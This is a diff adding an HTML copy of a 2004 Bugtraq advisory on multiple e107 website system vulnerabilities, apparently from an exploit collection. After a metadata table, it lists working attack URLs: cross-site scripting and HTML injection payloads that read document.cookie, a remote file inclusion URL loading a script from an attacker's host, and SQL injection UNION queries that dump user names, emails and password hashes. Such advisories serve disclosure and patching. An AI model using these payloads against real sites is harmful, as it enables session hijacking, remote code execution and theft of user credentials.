@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid10436<p><b><span style="font-size: 18pt;">e107 Website System Multiple Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/10436/info">info</a><br><a href="http://www.securityfocus.com/bid/10436/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/10436/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/10436/solution">solution</a><br><a href="http://www.securityfocus.com/bid/10436/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				10436
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 29 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 29 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to Janek Vind.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					e107 e107 website system 0.6 15a<br/>
+					
+				
+					e107 e107 website system 0.6 15<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					e107 e107 website system 0.616 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	A number of examples were provided.<br/><br/>- Cross-site scripting:<br/><br/>http://www.example.com/e107_0615/e107_plugins/clock_menu/clock_menu.php?clock_flat=1&amp;LAN_407=foo%22);<br/>//--%3E%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/><br/>http://www.example.com/e107_0615/usersettings.php?avmsg=xss code here<br/><br/>- HTML injection in the "email article to a friend" and "submit news" pages.:<br/><br/>foobar'&gt;&lt;body onload=alert(document.cookie);&gt;<br/><br/>- File inclusion:<br/><br/>http://www.example.com/e107_0615/e107_handlers/secure_img_render.php?p=http://&lt;attacker's host&gt;/&lt;attacker's script&gt;.php<br/><br/>- SQL injection:<br/><br/>http://www.example.com/e107_0615/content.php?content.99/**/UNION/**/SELECT/**/null,null,null,<br/>CONCAT(user_name,CHAR(58),user_email,CHAR(58),user_password),null,null,null,null,null,null,<br/>null,null,null/**/FROM/**/e107_user/**/WHERE/**/user_id=1/*<br/><br/>http://www.example.com/e107_0615/content.php?query=content_id=99%20UNION%20select%20null,<br/>CONCAT(user_name,CHAR(58),user_email,CHAR(58),user_password),null,null,null,null,null,<br/>null,null,null,null,null,null%20FROM%20e107_user%20WHERE%20user_id=1/*<br/><br/>http://www.example.com/e107_0615/news.php?list.99/**/UNION/**/SELECT/**/null,null,<br/>CONCAT(user_name,CHAR(58),user_email,CHAR(58),user_password),null,null,null,null,null,<br/>null,null,null,null/**/FROM/**/e107_user/**/WHERE/**/user_id=1/*
+	
+		<ul>
+</ul>
+</div>
